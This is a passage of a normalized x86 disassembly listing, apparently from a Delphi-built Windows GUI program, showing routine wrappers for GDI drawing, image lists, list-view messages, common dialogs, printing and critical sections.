and [ ebx + 0x8 ] 0xfd
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_4259a0
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x4
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfb
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_4259c0
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x8
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xf7
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_4259e0
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbc8
call sub_4039b8
pop ebx
retn
sub_4259f8
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbc8
call sub_4039b8
pop ebx
retn
sub_425a1c
mov eax [ rw-data ]
call sub_4259f8
retn
sub_425a7e
jmp sub_403980
sub_425a85
pop ecx
pop ebp
retn
sub_425b24
jmp sub_403980
sub_425b2b
pop ebx
mov esp ebp
pop ebp
retn
sub_425bfd
jmp sub_403980
sub_425c8e
jmp sub_403980
sub_425c95
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_425cc0
dec ecx
imul edx
add eax ecx
not ecx
and eax ecx
test eax eax
jns r-xdata
sar eax 0x3
retn
add eax 0x7
sub_425da7
jmp sub_403980
sub_425f54
jmp sub_403980
sub_425f5b
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x28
sub_42616d
jmp sub_403980
sub_426174
lea eax [ ebp - 0x408 ]
push eax
call CreatePalette
pop ebx
mov esp ebp
pop ebp
retn
sub_42620e
jmp sub_403980
sub_4263ea
jmp sub_403980
sub_4264a4
jmp sub_403980
sub_4264ab
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4264cb
mov eax [ ebp - 0x10 ]
push eax
push 0x0
call ReleaseDC
retn
sub_4264c4
jmp sub_403980
sub_4264cb
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_426659
jmp sub_403980
sub_426824
jmp sub_403980
sub_42682b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42684e
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x2c ]
call sub_40278c
retn
sub_426847
jmp sub_403980
sub_42684e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42686e
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
call sub_40278c
retn
sub_426867
jmp sub_403980
sub_42686e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_426878
xor ecx ecx
mov edx eax
add eax 0x14
jmp r-xdata
cmp edx eax
jl r-xdata
xor cx [ edx ]
add edx 0x2
mov eax ecx
retn
sub_4269d8
push 0x0
call sub_426974
retn
sub_426a7d
jmp sub_403980
sub_426a84
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_426a90
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
push 0x0
call sub_4269e0
pop ebx
pop ebp
retn 0x4
sub_426aa4
retn
sub_426aa8
test eax eax
jne r-xdata
retn
call sub_426aa4
sub_426c7b
jmp sub_403980
sub_426ca2
jmp sub_403980
sub_426ca9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_426ce8
push ebx
mov [ eax + 0x20 ] 0x1
cmp [ eax + 0x12 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
sub_426eb5
mov eax [ ebp - 0xc ]
call sub_4031ec
retn
sub_426ebe
jmp sub_403980
j_sub_426eb5
jmp sub_426eb5
sub_426ec5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4031ec
retn
sub_426edb
jmp sub_403980
sub_426eec
xor eax eax
retn
sub_426ef0
mov al [ eax + 0x21 ]
retn
sub_426f3c
jmp sub_403980
sub_426f43
pop esi
pop ecx
pop ebp
retn
sub_426f70
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
retn
sub_426fc7
jmp sub_403980
sub_426fce
pop esi
pop ecx
pop ebp
retn
sub_426fd4
retn
sub_426fd8
cmp dl [ eax + 0x21 ]
je r-xdata
retn
mov [ eax + 0x21 ] dl
mov edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_426fe8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop esi
retn
sub_42716d
jmp sub_403980
sub_427174
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_427293
jmp sub_403980
sub_42729a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_42732b
jmp sub_403980
sub_427332
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4273ba
jmp sub_403980
sub_4273c1
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42754b
jmp sub_403980
sub_427552
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_427708
jmp sub_4036cc
sub_42772c
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_427090
mov [ rw-data ] eax
sub_42774c
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_427618
mov [ rw-data ] eax
sub_427874
push ebx
mov ebx eax
mov edx [ r-xdata ]
mov eax ebx
call sub_427810
mov eax [ ebx + 0xc ]
pop ebx
retn
sub_42788c
push ebx
mov ebx eax
mov edx [ r-xdata ]
mov eax ebx
call sub_427810
mov eax [ ebx + 0xc ]
pop ebx
retn
sub_4278a4
push ebx
mov ebx eax
mov edx [ r-xdata ]
mov eax ebx
call sub_427810
mov eax [ ebx + 0xc ]
pop ebx
retn
sub_42794c
jmp sub_4036cc
sub_427a2f
jmp sub_4036cc
sub_427a90
jmp sub_403980
sub_427a97
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_427c25
jmp sub_4036cc
sub_427ca3
jmp sub_403980
sub_427caa
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_427e44
retn
sub_427eb8
jmp sub_403980
sub_4280cf
jmp sub_403980
sub_4280d6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4280f3
lea eax [ ebp - 0x20 ]
call sub_403f7c
retn
sub_4280ec
jmp sub_403980
sub_428400
cmp [ eax + 0x28 ] 0x0
sete al
retn
sub_428408
mov edx [ eax + 0x28 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_42847c
push ebx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
pop ebx
retn
mov eax ebx
call sub_4285f0
sub_428494
push ebx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
pop ebx
retn
mov eax ebx
call sub_4285f0
sub_428744
jmp sub_403980
sub_42874b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4288c3
jmp sub_403980
sub_4288ca
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_428959
jmp sub_403980
sub_428960
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428982
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403fa0
retn
sub_42897b
jmp sub_403980
sub_428982
pop ebx
mov esp ebp
pop ebp
retn
sub_428995
add [ eax ] al
add [ ebx + 0x74002878 ] al
adc al [ eax + 0x74002c78 ]
pop es
call sub_428d0c
jmp r-xdata
retn
sub_4289ab
call sub_428d98
retn
sub_428b30
retn
sub_428d88
jmp sub_403980
sub_428eb3
jmp sub_403980
sub_428eba
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
sub_428ed3
jmp sub_403980
sub_428f98
push ebx
mov ebx eax
mov eax ebx
call sub_428c08
mov eax [ ebx + 0x28 ]
mov edx [ eax + 0x8 ]
xor ecx ecx
mov [ eax + 0x8 ] ecx
mov eax edx
pop ebx
retn
sub_4290c6
jmp sub_403980
sub_4290ee
jmp sub_403980
sub_4290f5
mov esp ebp
pop ebp
retn
sub_42916c
jmp sub_403980
sub_429274
jmp sub_403980
sub_42935f
jmp sub_403980
sub_42936c
inc [ eax + 0x4 ]
retn
sub_4294e7
jmp sub_403980
sub_429898
jmp sub_403980
sub_429ae2
jmp sub_403980
sub_429b0c
jmp sub_403980
sub_429b13
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429b35
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
retn
sub_429b2e
jmp sub_403980
sub_429b3f
jmp sub_4036cc
sub_429b8e
jmp sub_403980
sub_429dbb
jmp sub_403980
sub_429e03
jmp sub_403980
sub_429f70
jmp sub_403980
sub_42a037
jmp sub_4036cc
sub_42a08c
mov [ eax + 0x31 ] 0x0
call sub_426ce8
retn
sub_42a2dd
jmp sub_403980
sub_42a348
jmp sub_403980
sub_42a34f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42a3c0
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp [ eax + 0x6c ] 0x0
je r-xdata
mov al 0x1
retn
sub_42a474
mov ecx eax
mov eax [ ecx + 0x28 ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
retn
sub_42a484
push ebx
mov ebx eax
mov eax ebx
call sub_42a63c
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
pop ebx
retn
sub_42a498
mov eax [ eax + 0x28 ]
add eax 0x18
cmp [ eax + 0x10 ] 0x1
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x12 ] 0x1
je r-xdata
mov al 0x1
retn
sub_42a4b4
push ebx
mov ebx eax
mov eax ebx
call sub_42a69c
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
pop ebx
retn
sub_42a510
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x1c ]
retn
sub_42a61f
jmp sub_403980
sub_42a850
jmp sub_403980
sub_42a857
pop ebx
pop ecx
pop ebp
retn
sub_42a8e3
jmp sub_4036cc
sub_42a943
jmp sub_403980
sub_42a94a
mov eax [ ebp - 0x4 ]
mov [ eax + 0x32 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
sub_42ad2b
jmp sub_403980
sub_42ad57
jmp sub_403980
sub_42adbe
jmp sub_4036cc
sub_42adef
jmp sub_403980
sub_42ae74
jmp sub_4036cc
sub_42ae79
mov eax [ ebp - 0x38 ]
call sub_4031ec
call sub_4039e0
call sub_403a34
sub_42ae8b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42aea8
mov eax [ ebp - 0x18 ]
call sub_40278c
retn
sub_42aea1
jmp sub_403980
sub_42aff7
jmp sub_4036cc
sub_42b2c3
jmp sub_4036cc
sub_42b3a4
mov cl 0x1
call sub_42b3ac
retn
sub_42b6bc
xor ecx ecx
call sub_42b3ac
retn
sub_42b73e
jmp sub_4036cc
sub_42b743
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push eax
call DeleteObject
call sub_4039e0
call sub_403a34
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42b794
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
pop ebx
retn
push eax
call DestroyIcon
sub_42b8cd
add [ eax ] al
add [ ebx + 0x78832840 ] cl
or [ eax ] al
jne r-xdata
xor eax eax
retn
cmp [ eax + 0xc ] 0x0
je r-xdata
mov al 0x1
retn
sub_42b8fc
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x14 ]
test eax eax
jne r-xdata
retn
push 0xc
call GetSystemMetrics
sub_42b910
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x10 ]
test eax eax
jne r-xdata
retn
push 0xb
call GetSystemMetrics
sub_42ba29
jmp sub_4036cc
sub_42bade
jmp sub_4036cc
sub_42bb48
jmp sub_4036cc
sub_42bb7c
push ebx
mov ebx eax
xor ecx ecx
mov eax ebx
call sub_42bb08
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop ebx
retn
sub_42bb94
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_4259e0
retn
mov [ eax + 0x30 ] edx
retn
sub_42bbac
retn
sub_42bbb0
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_4259e0
retn
mov [ eax + 0x2c ] edx
retn
sub_42bbf0
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_4259e0
pop ebp
retn 0x4
sub_42bc04
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_4259e0
pop ebp
retn 0x4
sub_42bc59
jmp sub_403980
sub_42bc60
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42be14
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_42be20
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_42becd
jmp sub_403980
sub_42bed4
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42bfbf
jmp sub_4036cc
sub_42c02b
jmp sub_403980
sub_42c159
jmp sub_403980
sub_42c160
pop ebp
retn
sub_42c295
jmp sub_403980
sub_42c29c
pop ebp
retn
sub_42c2a0
sub [ rw-data ] 0x1
retn
sub_42c4e8
mov edx [ eax + 0x4 ]
mov ecx [ edx + 0x8 ]
dec ecx
mov eax edx
mov edx ecx
call sub_418dc4
retn
sub_42c51c
mov eax [ eax + 0x4 ]
call sub_418c68
retn
sub_42c54d
jmp sub_403980
sub_42c554
pop ebp
retn
sub_42c558
sub [ rw-data ] 0x1
retn
InitCommonControls
jmp [ __import_lookup_table_14(comctl32:InitCommonControls) ]
ImageList_Create
jmp [ __import_lookup_table_14(comctl32:ImageList_Create) ]
ImageList_Destroy
jmp [ __import_lookup_table_14(comctl32:ImageList_Destroy) ]
ImageList_GetImageCount
jmp [ __import_lookup_table_14(comctl32:ImageList_GetImageCount) ]
ImageList_ReplaceIcon
jmp [ ImageList_ReplaceIcon@IAT ]
ImageList_SetBkColor
jmp [ ImageList_SetBkColor@IAT ]
ImageList_GetBkColor
jmp [ ImageList_GetBkColor@IAT ]
sub_42c640
shl eax 0x8
retn
ImageList_Replace
jmp [ __import_lookup_table_14(comctl32:ImageList_Replace) ]
ImageList_Remove
jmp [ __import_lookup_table_14(comctl32:ImageList_Remove) ]
ImageList_BeginDrag
jmp [ __import_lookup_table_14(comctl32:ImageList_BeginDrag) ]
ImageList_EndDrag
jmp [ __import_lookup_table_14(comctl32:ImageList_EndDrag) ]
ImageList_DragEnter
jmp [ __import_lookup_table_14(comctl32:ImageList_DragEnter) ]
ImageList_DragLeave
jmp [ __import_lookup_table_14(comctl32:ImageList_DragLeave) ]
ImageList_DragMove
jmp [ __import_lookup_table_14(comctl32:ImageList_DragMove) ]
ImageList_DragShowNolock
jmp [ ImageList_DragShowNolock@IAT ]
ImageList_GetDragImage
jmp [ ImageList_GetDragImage@IAT ]
ImageList_Read
jmp [ ImageList_Read@IAT ]
ImageList_Write
jmp [ ImageList_Write@IAT ]
ImageList_GetIconSize
jmp [ ImageList_GetIconSize@IAT ]
ImageList_SetIconSize
jmp [ ImageList_SetIconSize@IAT ]
sub_42c6c4
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1001
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42c6f8
push 0x0
push 0x0
push 0x1004
push eax
call SendMessageA
retn
sub_42c708
shl eax 0xc
retn
sub_42c70c
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1005
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42c724
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1006
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42c73c
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1007
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42c754
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x1008
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42c76c
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x1009
push ebx
call SendMessageA
pop ebx
retn
sub_42c7a4
push ecx
push edx
push 0x100d
push eax
call SendMessageA
retn
sub_42c7f0
push edx
push 0x0
push 0x1012
push eax
call SendMessageA
retn
sub_42c81c
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x1016
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42c834
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x1018
push ebx
call SendMessageA
pop ebx
retn
sub_42c864
push ecx
push edx
push 0x101b
push eax
call SendMessageA
retn
sub_42c874
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x101c
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42c88c
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x101d
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42c8e4
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1024
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42c8fc
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1026
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42c914
push 0x0
push 0x0
push 0x1027
push eax
call SendMessageA
retn
sub_42c924
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1029
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42c98c
push ecx
push edx
push 0x102c
push eax
call SendMessageA
retn
sub_42ca18
push 0x0
push edx
push 0x102f
push eax
call SendMessageA
retn
sub_42ca28
push ecx
push edx
push 0x102f
push eax
call SendMessageA
retn
sub_42ca54
push 0x0
push 0x0
push 0x1032
push eax
call SendMessageA
retn
sub_42ca64
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1036
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42cad0
push edx
push 0x0
push 0x1047
push eax
call SendMessageA
retn
sub_42cae0
push 0x0
push 0x0
push 0x1048
push eax
call SendMessageA
retn
sub_42caf0
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1002
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42cb08
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x1004
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42cb20
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1006
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42cb38
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1009
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42cb6c
push edx
push 0x0
push 0x100f
push eax
call SendMessageA
retn
sub_42cb98
push 0x0
push edx
push 0x1014
push eax
call SendMessageA
retn
sub_42cbcd
jmp sub_403980
sub_42cbd4
pop ebp
retn
sub_42cbd8
sub [ rw-data ] 0x1
retn
sub_42cc9f
jmp sub_403980
sub_42cca6
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42d2bc
push r-xdata
call GetModuleHandleA
mov [ rw-data ] eax
mov [ rw-data ] sub_42ccc8
mov [ rw-data ] sub_42cde0
mov [ rw-data ] sub_42cd50
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] sub_42cfe4
mov [ rw-data ] sub_42d0b8
mov [ rw-data ] sub_42d18c
retn
sub_42d34d
jmp sub_403980
sub_42d354
pop ebp
retn
sub_42d358
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_42d2bc
sub_42d38d
jmp sub_403980
sub_42d394
pop ebp
retn
sub_42d398
sub [ rw-data ] 0x1
retn
sub_42d627
add eax 0xffffffd4
jmp sub_42e154
sub_42d62f
add eax 0xffffffd4
jmp sub_42e1b0
sub_42d637
add [ esp + 0x4 ] 0xffffffd4
jmp sub_40594c
sub_42d641
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405974
sub_42d64b
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405988
sub_42d657
jmp 0xfffffffff3431931
sub_42d7da
jmp sub_403980
sub_42d7e1
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42d9f1
jmp sub_403980
sub_42d9f8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42dbad
jmp sub_403980
sub_42dc12
jmp sub_403980
sub_42dc19
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42dd05
jmp sub_403980
sub_42dd0c
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_42df1c
lea eax [ ebp - 0x30 ]
call sub_403f7c
lea eax [ ebp - 0x20 ]
call sub_403f7c
retn
sub_42df2d
jmp sub_403980
j_sub_42df1c
jmp sub_42df1c
sub_42df34
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42e02f
jmp sub_403980
sub_42e036
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42e133
jmp sub_403980
sub_42e13a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42e19a
lea eax [ ebp - 0x4 ]
call sub_4058a0
retn
sub_42e1a3
jmp sub_403980
j_sub_42e19a
jmp sub_42e19a
sub_42e1aa
pop ebx
pop ecx
pop ebp
retn
sub_42e245
jmp sub_403980
sub_42e24c
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_42e258
mov eax [ eax + 0x20 ]
retn
sub_42e387
jmp sub_403980
sub_42e38e
pop ebp
retn
sub_42e390
sub [ rw-data ] 0x1
retn
ClosePrinter
jmp [ __import_lookup_table_15(winspool:ClosePrinter) ]
OpenPrinterA
jmp [ OpenPrinterA@IAT ]
sub_42e3dd
jmp sub_403980
sub_42e3e4
pop ebp
retn
sub_42e3e8
sub [ rw-data ] 0x1
retn
sub_42e697
jmp sub_403980
sub_42e69e
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_42e87e
jmp sub_403980
sub_42e885
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42e8f1
jmp sub_403980
sub_42e8f8
pop ecx
pop ecx
pop ebp
retn
sub_42ec0f
jmp sub_403980
sub_42ec16
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_42ec20
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_42e760
mov eax [ ebx + 0x20 ]
pop ebx
retn
sub_42ec8b
jmp sub_403980
sub_42ec92
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_42ed02
jmp sub_403980
sub_42ed09
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42ed10
push ebx
mov ebx eax
cmp [ ebx + 0x14 ] 0xffffffff
jne r-xdata
mov eax [ ebx + 0x14 ]
pop ebx
retn
mov eax ebx
call sub_42ef68
sub_42ef03
jmp sub_403980
sub_42ef14
jmp sub_4036cc
sub_42ef57
jmp sub_403980
sub_42ef5e
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42f105
jmp sub_403980
sub_42f145
jmp sub_403980
sub_42f14c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42f1a4
add eax 0x8
call sub_40d538
retn
sub_42f1b0
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42e6a8
mov [ rw-data ] eax
sub_42f201
jmp sub_403980
sub_42f208
pop ebp
retn
sub_42f20c
sub [ rw-data ] 0x1
retn
sub_42f519
jmp sub_403980
sub_42f520
pop ebp
retn
sub_42f524
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_42f270
sub_42f604
retn
sub_42f678
add eax 0x4
push eax
call EnterCriticalSection
retn
sub_42f684
add eax 0x4
push eax
call LeaveCriticalSection
retn
sub_42f690
mov edx [ eax ]
call [ edx ]
retn
sub_42f698
mov edx [ eax ]
call [ edx + 0x4 ]
retn
sub_42f6c5
jmp sub_403980
sub_42f6cc
pop ebp
retn
sub_42f6d0
sub [ rw-data ] 0x1
retn
sub_42f88f
jmp sub_403980
sub_42f896
pop ebp
retn
sub_42fc4b
jmp sub_403980
sub_42fc52
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_43006c
jmp sub_403980
sub_430073
pop ebp
retn
sub_430078
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42f608
mov [ rw-data ] eax
sub_4300b9
jmp sub_403980
sub_4300c0
pop ebp
retn
sub_4300c4
sub [ rw-data ] 0x1
retn
sub_4300f1
jmp sub_403980
sub_4300f8
pop ebp
retn
sub_4300fc
sub [ rw-data ] 0x1
retn
sub_430129
jmp sub_403980
sub_430130
pop ebp
retn
sub_430134
sub [ rw-data ] 0x1
retn
sub_430161
jmp sub_403980
sub_430168
pop ebp
retn
sub_43016c
sub [ rw-data ] 0x1
retn
sub_430199
jmp sub_403980
sub_4301a0
pop ebp
retn
sub_4301a4
sub [ rw-data ] 0x1
retn
sub_4301d1
jmp sub_403980
sub_4301d8
pop ebp
retn
sub_4301dc
sub [ rw-data ] 0x1
retn
sub_430271
jmp sub_403980
sub_430278
pop ebp
retn
sub_43027c
sub [ rw-data ] 0x1
retn
GetOpenFileNameA
jmp [ __import_lookup_table_16(comdlg32:GetOpenFileNameA) ]
GetSaveFileNameA
jmp [ GetSaveFileNameA@IAT ]
ChooseColorA
jmp [ ChooseColorA@IAT ]
FindTextA
jmp [ FindTextA@IAT ]
ReplaceTextA
jmp [ ReplaceTextA@IAT ]
ChooseFontA
jmp [ ChooseFontA@IAT ]
PrintDlgA
jmp [ PrintDlgA@IAT ]
sub_4302e9
jmp sub_403980
sub_4302f0
pop ebp
retn
sub_4302f4
sub [ rw-data ] 0x1
retn
sub_430321
jmp sub_403980
sub_430328
pop ebp
retn
sub_43032c
sub [ rw-data ] 0x1
retn
sub_430338
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
sub_431f4a
jmp sub_4036cc
sub_431f4f
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_4759fc
call sub_403a34
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_431f6c
mov ecx [ eax ]
call [ ecx - 0x14 ]
retn
sub_431f74
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
mov si 0xffef
call sub_4033e8
pop esi
retn
sub_431f8c
push ebx
push esi
mov ebx edx
mov si 0xffee
call sub_4033e8
xor eax eax
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_431fa4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x3c ] eax
pop esi
retn
sub_43204d
jmp sub_403980
sub_43207b
jmp sub_403980
sub_432082
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43208c
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_4320a0
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_432338
push ebx
cmp [ eax + 0x8a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_432358
push ebx
cmp [ eax + 0x92 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_432378
push ebx
cmp [ eax + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
sub_4323ca
jmp sub_403980
sub_4323d1
pop ecx
pop ebp
retn
sub_432719
jmp sub_403980
sub_432720
mov eax esi
pop esi
pop ebx
mov esp ebp
